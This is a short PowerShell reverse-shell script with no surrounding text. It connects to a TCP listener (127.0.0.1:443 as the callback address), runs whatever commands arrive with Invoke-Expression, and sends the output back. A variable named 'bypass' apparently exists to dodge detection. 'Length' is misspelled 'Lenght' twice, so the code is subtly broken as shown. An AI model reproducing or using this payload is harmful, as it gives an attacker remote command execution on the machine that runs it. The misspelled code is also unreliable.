$sm=(New-Object Net.Sockets.TCPClient('127.0.0.1', 443)).GetStream();
[byte[]]$bt=0..65535|%{0};while(($i=$sm.Read($bt,0,$bt.Lenght)) -ne 0){;
$d=(New-Object Text.ASCIIEncoding).GetString($bt,0,$i);
$bypass = "ASCII"
$st=([text.encoding]::$bypass).GetBytes((iex $d 2>&1));
$sm.Write($st,0,$st.Lenght)}


